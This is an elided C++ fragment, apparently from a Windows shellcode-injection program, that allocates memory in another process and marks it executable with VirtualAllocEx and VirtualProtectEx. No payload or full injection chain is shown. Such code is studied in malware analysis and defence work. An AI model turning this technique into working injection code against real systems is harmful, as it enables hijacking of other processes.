...
int _tmain(int argc, _TCHAR* argv[])
{
	...
	memAddress = (LPVOID)VirtualAllocEx(hProcess, NULL, strlen(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_READONLY);
	if (memAddress == NULL){
	...
	DWORD oldProtection;
	bstatus = VirtualProtectEx(hProcess, memAddress, strlen(shellcode), PAGE_EXECUTE_READWRITE, &oldProtection);
	if (!bstatus){
		wcout << "\n  WARNING: VirtualProtectEx() ERROR!" << endl;
		sysError();
		return ERROR_SUCCESS;
	}
